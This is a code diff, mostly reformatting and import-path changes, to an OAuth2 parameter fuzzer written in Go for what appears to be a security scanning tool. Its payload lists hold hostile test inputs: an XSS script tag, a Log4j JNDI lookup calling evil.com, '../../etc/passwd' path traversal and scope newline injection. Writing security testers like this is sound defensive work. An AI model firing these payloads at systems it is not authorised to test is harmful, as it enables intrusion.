@@ -10,9 +10,8 @@ import (
 	"strings"
 	"time"
 
-	"github.com/google/gofuzz"
-	"github.com/yourusername/shells/internal/core"
-	"github.com/yourusername/shells/pkg/types"
+	"github.com/CodeMonkeyCybersecurity/shells/internal/core"
+	"github.com/CodeMonkeyCybersecurity/shells/pkg/types"
 )
 
 type oauth2Fuzzer struct {
@@ -26,13 +25,13 @@ type oauth2Fuzzer struct {
 }
 
 type FuzzerConfig struct {
-	Threads       int
-	RequestDelay  time.Duration
-	Timeout       time.Duration
-	MaxRedirects  int
-	UserAgent     string
-	EnableOOB     bool
-	OOBServer     string
+	Threads      int
+	RequestDelay time.Duration
+	Timeout      time.Duration
+	MaxRedirects int
+	UserAgent    string
+	EnableOOB    bool
+	OOBServer    string
 }
 
 type OAuth2FuzzCase struct {
@@ -46,13 +45,13 @@ type OAuth2FuzzCase struct {
 }
 
 type FuzzResult struct {
-	TestCase    string
-	Parameter   string
-	Payload     string
-	Response    *http.Response
+	TestCase     string
+	Parameter    string
+	Payload      string
+	Response     *http.Response
 	ResponseBody string
-	Vulnerable  bool
-	Evidence    string
+	Vulnerable   bool
+	Evidence     string
 }
 
 func NewOAuth2Fuzzer(config FuzzerConfig, logger interface {
@@ -69,7 +68,7 @@ func NewOAuth2Fuzzer(config FuzzerConfig, logger interface {
 	if config.RequestDelay == 0 {
 		config.RequestDelay = 100 * time.Millisecond
 	}
-	
+
 	return &oauth2Fuzzer{
 		client: &http.Client{
 			Timeout: config.Timeout,
@@ -97,52 +96,52 @@ func (f *oauth2Fuzzer) Validate(target string) error {
 	if target == "" {
 		return fmt.Errorf("target cannot be empty")
 	}
-	
+
 	if !strings.HasPrefix(target, "http://") && !strings.HasPrefix(target, "https://") {
 		return fmt.Errorf("target must be a valid HTTP/HTTPS URL")
 	}
-	
+
 	return nil
 }
 
 func (f *oauth2Fuzzer) Scan(ctx context.Context, target string, options map[string]string) ([]types.Finding, error) {
 	f.logger.Info("Starting OAuth2 parameter fuzzing", "target", target)
-	
+
 	findings := []types.Finding{}
-	
+
 	// Get OAuth2 fuzzing test cases
 	testCases := f.getOAuth2TestCases(options)
-	
+
 	// Run each test case
 	for _, testCase := range testCases {
 		f.logger.Debug("Running OAuth2 fuzz test", "test", testCase.Name, "param", testCase.Parameter)
-		
+
 		for _, payload := range testCase.Payloads {
 			select {
 			case <-ctx.Done():
 				return findings, ctx.Err()
 			default:
 			}
-			
+
 			// Apply rate limiting
 			time.Sleep(f.config.RequestDelay)
-			
+
 			// Execute test
 			result, err := f.executeTest(ctx, target, testCase, payload, options)
 			if err != nil {
 				f.logger.Error("Test execution failed", "test", testCase.Name, "error", err)
 				continue
 			}
-			
+
 			if result.Vulnerable {
 				finding := types.Finding{
-					Tool:     "oauth2_fuzzer",
-					Type:     "oauth2_parameter_vulnerability",
-					Severity: testCase.Severity,
-					Title:    fmt.Sprintf("OAuth2 %s Vulnerability", testCase.Name),
+					Tool:        "oauth2_fuzzer",
+					Type:        "oauth2_parameter_vulnerability",
+					Severity:    testCase.Severity,
+					Title:       fmt.Sprintf("OAuth2 %s Vulnerability", testCase.Name),
 					Description: testCase.Description,
-					Evidence: result.Evidence,
-					Solution: f.getSolution(testCase.Name),
+					Evidence:    result.Evidence,
+					Solution:    f.getSolution(testCase.Name),
 					Metadata: map[string]interface{}{
 						"parameter":     testCase.Parameter,
 						"payload":       result.Payload,
@@ -151,16 +150,16 @@ func (f *oauth2Fuzzer) Scan(ctx context.Context, target string, options map[stri
 					},
 				}
 				findings = append(findings, finding)
-				
-				f.logger.Info("Vulnerability found", 
-					"test", testCase.Name, 
+
+				f.logger.Info("Vulnerability found",
+					"test", testCase.Name,
 					"param", testCase.Parameter,
 					"payload", result.Payload[:min(50, len(result.Payload))],
 				)
 			}
 		}
 	}
-	
+
 	return findings, nil
 }
 
@@ -169,7 +168,7 @@ func (f *oauth2Fuzzer) getOAuth2TestCases(options map[string]string) []OAuth2Fuz
 	if oobServer == "" {
 		oobServer = "https://interact.sh"
 	}
-	
+
 	return []OAuth2FuzzCase{
 		{
 			Name:        "Redirect URI Bypass",
@@ -200,14 +199,14 @@ func (f *oauth2Fuzzer) getOAuth2TestCases(options map[string]string) []OAuth2Fuz
 			Parameter:   "state",
 			Severity:    types.SeverityMedium,
 			Payloads: []string{
-				"", // Empty state
-				"1234", // Weak state
-				"admin", // Predictable state
-				"test", // Common state
+				"",                          // Empty state
+				"1234",                      // Weak state
+				"admin",                     // Predictable state
+				"test",                      // Common state
 				"<script>alert(1)</script>", // XSS
 				"${jndi:ldap://evil.com/a}", // Log4j
-				"../../etc/passwd", // Path traversal
-				strings.Repeat("A", 10000), // Long input
+				"../../etc/passwd",          // Path traversal
+				strings.Repeat("A", 10000),  // Long input
 				"null",
 				"undefined",
 				"0",
@@ -242,17 +241,17 @@ func (f *oauth2Fuzzer) getOAuth2TestCases(options map[string]string) []OAuth2Fuz
 			Parameter:   "response_type",
 			Severity:    types.SeverityHigh,
 			Payloads: []string{
-				"code token", // Hybrid flow
-				"code id_token", // Hybrid flow
+				"code token",          // Hybrid flow
+				"code id_token",       // Hybrid flow
 				"code token id_token", // Hybrid flow
-				"token code", // Reversed
-				"id_token code", // Reversed
-				"invalid", // Invalid type
-				"", // Empty
-				"code%20token", // URL encoded
-				"code+token", // Plus encoded
-				"none", // Invalid
-				"implicit", // Legacy
+				"token code",          // Reversed
+				"id_token code",       // Reversed
+				"invalid",             // Invalid type
+				"",                    // Empty
+				"code%20token",        // URL encoded
+				"code+token",          // Plus encoded
+				"none",                // Invalid
+				"implicit",            // Legacy
 			},
 		},
 		{
@@ -274,7 +273,7 @@ func (f *oauth2Fuzzer) getOAuth2TestCases(options map[string]string) []OAuth2Fuz
 				"scope:admin",
 				strings.Repeat("admin ", 100),
 				"read\nwrite\nadmin", // Newline injection
-				"read write delete", // Additional permissions
+				"read write delete",  // Additional permissions
 			},
 		},
 		{
@@ -283,13 +282,13 @@ func (f *oauth2Fuzzer) getOAuth2TestCases(options map[string]string) []OAuth2Fuz
 			Parameter:   "code_challenge",
 			Severity:    types.SeverityHigh,
 			Payloads: []string{
-				"", // Empty challenge
-				"1234", // Weak challenge
-				"plain", // Plain text (should use S256)
-				"test", // Predictable
+				"",                       // Empty challenge
+				"1234",                   // Weak challenge
+				"plain",                  // Plain text (should use S256)
+				"test",                   // Predictable
 				strings.Repeat("A", 128), // Max length
-				strings.Repeat("A", 43), // Min length
-				"invalid_base64!", // Invalid base64
+				strings.Repeat("A", 43),  // Min length
+				"invalid_base64!",        // Invalid base64
 				base64.URLEncoding.EncodeToString([]byte("weak")), // Weak entropy
 			},
 		},
@@ -299,14 +298,14 @@ func (f *oauth2Fuzzer) getOAuth2TestCases(options map[string]string) []OAuth2Fuz
 			Parameter:   "nonce",
 			Severity:    types.SeverityMedium,
 			Payloads: []string{
-				"", // Empty nonce
-				"1234", // Weak nonce
-				"test", // Predictable
-				"admin", // Privileged
-				"replay", // Replay attack
+				"",                          // Empty nonce
+				"1234",                      // Weak nonce
+				"test",                      // Predictable
+				"admin",                     // Privileged
+				"replay",                    // Replay attack
 				"<script>alert(1)</script>", // XSS
-				strings.Repeat("A", 1000), // Long input
-				"../../etc/passwd", // Path traversal
+				strings.Repeat("A", 1000),   // Long input
+				"../../etc/passwd",          // Path traversal
 				"null",
 				"undefined",
 			},
@@ -317,16 +316,16 @@ func (f *oauth2Fuzzer) getOAuth2TestCases(options map[string]string) []OAuth2Fuz
 			Parameter:   "grant_type",
 			Severity:    types.SeverityHigh,
 			Payloads: []string{
-				"password", // Resource owner password
+				"password",           // Resource owner password
 				"client_credentials", // Client credentials
-				"refresh_token", // Refresh token
-				"implicit", // Implicit (deprecated)
+				"refresh_token",      // Refresh token
+				"implicit",           // Implicit (deprecated)
 				"authorization_code", // Authorization code
-				"device_code", // Device code
-				"", // Empty
-				"invalid", // Invalid type
-				"code", // Shortened
-				"token", // Token
+				"device_code",        // Device code
+				"",                   // Empty
+				"invalid",            // Invalid type
+				"code",               // Shortened
+				"token",              // Token
 			},
 		},
 	}
@@ -338,20 +337,20 @@ func (f *oauth2Fuzzer) executeTest(ctx context.Context, target string, testCase 
 	if err != nil {
 		return nil, err
 	}
-	
+
 	// Build query parameters
 	params := url.Values{}
-	
+
 	// Add default OAuth2 parameters
 	params.Set("client_id", f.getOrDefault(options, "client_id", "test_client"))
 	params.Set("response_type", f.getOrDefault(options, "response_type", "code"))
 	params.Set("redirect_uri", f.getOrDefault(options, "redirect_uri", "https://example.com/callback"))
 	params.Set("state", f.generateRandomString(16))
 	params.Set("scope", f.getOrDefault(options, "scope", "openid profile"))
-	
+
 	// Override with fuzzed parameter
 	params.Set(testCase.Parameter, payload)
-	
+
 	// Handle special cases for certain parameters
 	switch testCase.Parameter {
 	case "code_challenge":
@@ -362,35 +361,35 @@ func (f *oauth2Fuzzer) executeTest(ctx context.Context, target string, testCase 
 			target = strings.Replace(target, "/authorize", "/token", 1)
 		}
 	}
-	
+
 	baseURL.RawQuery = params.Encode()
 	testURL := baseURL.String()
-	
+
 	// Create request
 	req, err := http.NewRequestWithContext(ctx, "GET", testURL, nil)
 	if err != nil {
 		return nil, err
 	}
-	
+
 	if f.config.UserAgent != "" {
 		req.Header.Set("User-Agent", f.config.UserAgent)
 	}
-	
+
 	// Execute request
 	resp, err := f.client.Do(req)
 	if err != nil {
 		return nil, err
 	}
 	defer resp.Body.Close()
-	
+
 	// Read response body (limited to prevent memory issues)
 	bodyBytes := make([]byte, 10240) // 10KB limit
 	n, _ := resp.Body.Read(bodyBytes)
 	responseBody := string(bodyBytes[:n])
-	
+
 	// Analyze response for vulnerabilities
 	vulnerable, evidence := f.analyzeResponse(testCase, payload, resp, responseBody)
-	
+
 	return &FuzzResult{
 		TestCase:     testCase.Name,
 		Parameter:    testCase.Parameter,
@@ -404,43 +403,43 @@ func (f *oauth2Fuzzer) executeTest(ctx context.Context, target string, testCase 
 
 func (f *oauth2Fuzzer) analyzeResponse(testCase OAuth2FuzzCase, payload string, resp *http.Response, body string) (bool, string) {
 	evidence := []string{}
-	
+
 	switch testCase.Name {
 	case "Redirect URI Bypass":
 		// Check if redirect was successful to malicious domain
 		if resp.StatusCode == http.StatusFound || resp.StatusCode == http.StatusMovedPermanently {
 			location := resp.Header.Get("Location")
-			if strings.Contains(location, "evil.com") || 
-			   strings.Contains(location, "interact.sh") ||
-			   strings.HasPrefix(location, "javascript:") ||
-			   strings.HasPrefix(location, "data:") {
+			if strings.Contains(location, "evil.com") ||
+				strings.Contains(location, "interact.sh") ||
+				strings.HasPrefix(location, "javascript:") ||
+				strings.HasPrefix(location, "data:") {
 				evidence = append(evidence, fmt.Sprintf("Malicious redirect to: %s", location))
 				return true, strings.Join(evidence, "\n")
 			}
 		}
-		
+
 	case "State Parameter Manipulation":
 		// Check for missing state validation
-		if (payload == "" || payload == "1234") && 
-		   (resp.StatusCode == http.StatusFound || resp.StatusCode == http.StatusOK) {
+		if (payload == "" || payload == "1234") &&
+			(resp.StatusCode == http.StatusFound || resp.StatusCode == http.StatusOK) {
 			evidence = append(evidence, "Server accepted weak/missing state parameter")
 			return true, strings.Join(evidence, "\n")
 		}
-		
+
 		// Check for XSS in state parameter
 		if strings.Contains(payload, "<script>") && strings.Contains(body, "<script>") {
 			evidence = append(evidence, "XSS payload reflected in response")
 			return true, strings.Join(evidence, "\n")
 		}
-		
+
 	case "Client ID Enumeration":
 		// Check for information disclosure
-		if resp.StatusCode == http.StatusOK && 
-		   (strings.Contains(body, "admin") || strings.Contains(body, "internal")) {
+		if resp.StatusCode == http.StatusOK &&
+			(strings.Contains(body, "admin") || strings.Contains(body, "internal")) {
 			evidence = append(evidence, "Potential information disclosure in response")
 			return true, strings.Join(evidence, "\n")
 		}
-		
+
 	case "Response Type Confusion":
 		// Check for hybrid flow acceptance
 		if strings.Contains(payload, " ") && resp.StatusCode == http.StatusFound {
@@ -450,46 +449,46 @@ func (f *oauth2Fuzzer) analyzeResponse(testCase OAuth2FuzzCase, payload string, 
 				return true, strings.Join(evidence, "\n")
 			}
 		}
-		
+
 	case "Scope Manipulation":
 		// Check for privilege escalation
 		if strings.Contains(strings.ToLower(payload), "admin") && resp.StatusCode == http.StatusFound {
 			evidence = append(evidence, "Admin scope accepted")
 			return true, strings.Join(evidence, "\n")
 		}
-		
+
 	case "PKCE Code Challenge Bypass":
 		// Check for PKCE bypass
-		if (payload == "" || payload == "1234") && 
-		   (resp.StatusCode == http.StatusFound || resp.StatusCode == http.StatusOK) {
+		if (payload == "" || payload == "1234") &&
+			(resp.StatusCode == http.StatusFound || resp.StatusCode == http.StatusOK) {
 			evidence = append(evidence, "PKCE challenge bypass possible")
 			return true, strings.Join(evidence, "\n")
 		}
-		
+
 	case "Grant Type Confusion":
 		// Check for grant type confusion
-		if resp.StatusCode == http.StatusOK && 
-		   (strings.Contains(body, "access_token") || strings.Contains(body, "token")) {
+		if resp.StatusCode == http.StatusOK &&
+			(strings.Contains(body, "access_token") || strings.Contains(body, "token")) {
 			evidence = append(evidence, "Unexpected grant type accepted")
 			return true, strings.Join(evidence, "\n")
 		}
 	}
-	
+
 	// General vulnerability indicators
 	if resp.StatusCode >= 500 {
 		evidence = append(evidence, fmt.Sprintf("Server error (HTTP %d) - potential DoS", resp.StatusCode))
 		return true, strings.Join(evidence, "\n")
 	}
-	
+
 	// Check for error disclosure
-	if strings.Contains(body, "stack trace") || 
-	   strings.Contains(body, "exception") ||
-	   strings.Contains(body, "database") ||
-	   strings.Contains(body, "SQL") {
+	if strings.Contains(body, "stack trace") ||
+		strings.Contains(body, "exception") ||
+		strings.Contains(body, "database") ||
+		strings.Contains(body, "SQL") {
 		evidence = append(evidence, "Information disclosure in error message")
 		return true, strings.Join(evidence, "\n")
 	}
-	
+
 	return false, ""
 }
 
@@ -497,12 +496,12 @@ func (f *oauth2Fuzzer) extractHost(uri string) string {
 	if uri == "" {
 		return "example.com"
 	}
-	
+
 	u, err := url.Parse(uri)
 	if err != nil {
 		return "example.com"
 	}
-	
+
 	return u.Host
 }
 
@@ -557,7 +556,7 @@ func (f *oauth2Fuzzer) getSolution(testCase string) string {
 			"3. Implement proper client authentication\n" +
 			"4. Follow OAuth 2.0 specifications",
 	}
-	
+
 	if solution, ok := solutions[testCase]; ok {
 		return solution
 	}
